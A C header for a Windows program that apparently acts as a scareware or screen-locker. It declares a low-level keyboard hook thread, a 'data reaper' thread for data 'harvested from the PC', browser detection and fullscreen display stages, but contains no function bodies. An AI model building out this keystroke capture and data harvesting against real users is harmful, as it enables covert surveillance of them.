#ifndef UNICODE
# define UNICODE
#endif

#ifndef _UNICODE
# define _UNICODE
#endif

/*#include <sdkddkver.h>

#ifndef WINVER
# define WINVER _WIN32_WINNT_WIN6
#endif
#ifndef _WIN32_WINNT
# define _WIN32_WINNT _WIN32_WINNT_WIN6
#endif*/

#include <windows.h>
#include <windowsx.h> //various GDI functions
#include <synchapi.h>
#include <process.h>
#include <wchar.h>

#include <npapi.h> //GetUserName
#include <lmcons.h> //username length UNLEN


#undef __CRT__NO_INLINE
#include <strsafe.h> //win32 native string handling

#define win_free(x) HeapFree(GetProcessHeap(), 0, x)
#define win_malloc(x) HeapAlloc(GetProcessHeap(), 0, x)
#define win_realloc(x, y) HeapReAlloc(GetProcessHeap(), 0, x, y)
#define win_calloc(x, y) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, x * y)

//RGB color macros
#define RGB_WHITE       RGB(255, 255, 255)
#define RGB_BLACK       RGB(0, 0, 0)
#define RGB_ORANGE      RGB(255, 116, 53)
#define RGB_PURPLE      RGB(64, 0, 255)
#define RGB_GREEN       RGB(0, 204, 0)
#define RGB_RED         RGB(255, 0, 0)
#define RGB_BLUE        RGB(0, 128, 255)
#define RGB_YELLOW      RGB(255, 255, 102)
#define RGB_PURPLEBLUE  RGB(64, 55, 145)
#define RGB_BLINKING    RGB(GetTickCount()%255, 255 - GetTickCount()%255, 0)

#define MAX_COLUMN_SZ     53
#define CENTER_CX_SCREEN(x)  ((screenBuff->rc.right / 2) - ((x / 2) * ((fontSize/2) + 1)))


typedef signed char         int8_t;
typedef unsigned char       uint8_t;
typedef short               int16_t;
typedef unsigned short      uint16_t;
typedef int                 int32_t;
typedef unsigned            uint32_t;
typedef long long           int64_t;
typedef unsigned long long  uint64_t;

typedef enum _browser_flags {
    NO_BROWSER = 0x00000000,
    FIREFOX_BROWSER = 0x00000001, //0000 0001
    CHROME_BROWSER = 0x00000002,  //0000 0010
    IE_BROWSER = 0x00000004       //0000 0100
} WEB_BROWSER;

typedef struct _backbuffer_data {
    HBITMAP hBitmap;
    HDC hDC;
    RECT rc;
} BACKBUFFER;

typedef struct _keystroke_data {
    DWORD virtual_code;
    WCHAR pressed_char;
    BOOL is_printable;
    BOOL key_is_pressed;
    BOOL alt_is_pressed;
} KEYSTROKE;

typedef struct _user_data { //other data harvested from the PC go here
    PWSTR szName;
    PWSTR szNameUpper;
} USER;

typedef struct _pc_data {
    BOOL isWow64;
    WORD arch;
    WEB_BROWSER brInstalled;
} PC;


extern DWORD fontSize;
extern HINSTANCE g_hInstance;


/*== GRSrun.c declarations begin ==*/
extern HFONT fntConsole;
extern BACKBUFFER *screenBuff;
extern HWND hScreen;
extern BOOL exitApp;
extern HANDLE hKillThreadEvent;

int Run(void);
/* GRSrun.c declarations end */


/*== GRSbackbuffer.c declarations begin ==*/
BACKBUFFER *NewBackbuffer(HWND hwnd);
void DeleteBackbuffer(BACKBUFFER *to_delete);
void DrawBufferToWindow(void);
/* GRSbackbuffer.c declarations end */


/*== GRSwelcomestage.c declarations begin ==*/
void WelcomeStage(void);
void ExpandScreenCarpet(void);
void ShrinkScreenCarpet(void);
/* GRSwelcomestage.c declarations end */


/*== GRSdrawsysstage.c declarations begin ==*/
void DrawSysRead(void);
/* GRSdrawsysstage.c declarations end */


/*== GRSkeyhook.c declarations begin ==*/
extern HHOOK LLKeyboardHook;
extern HANDLE hKeyHookThread;
extern CRITICAL_SECTION csReadKeystroke;
extern KEYSTROKE g_keystroke;

void InitLLKeyboardHookThread(void);
/* GRSkeyhook.c declarations end */


/*== GRSinputbuffer.c declarations begin ==*/
extern WCHAR szInputBuff[MAX_COLUMN_SZ];
extern uint32_t current_column;

BOOL ReadNextCharToInputBuffer(void);
BOOL StrCmpInputBuffer(WCHAR *szBuff);
/* GRSinputbuffer.c declarations end */


/*== GRSdatareaper.c declarations begin ==*/
extern HANDLE hDataRprThread;
extern CRITICAL_SECTION csReadUserData;
extern USER User;

void InitDataReaperThread(void);
/* GRSdatareaper.c declarations end */


/*== GRSpcstatus.c declarations begin ==*/
extern HANDLE hPCStatusThread;
extern CRITICAL_SECTION csReadPCData;
extern PC this_system;

void InitPCStatusThread(void);
/* GRSpcstatus.c declarations end */
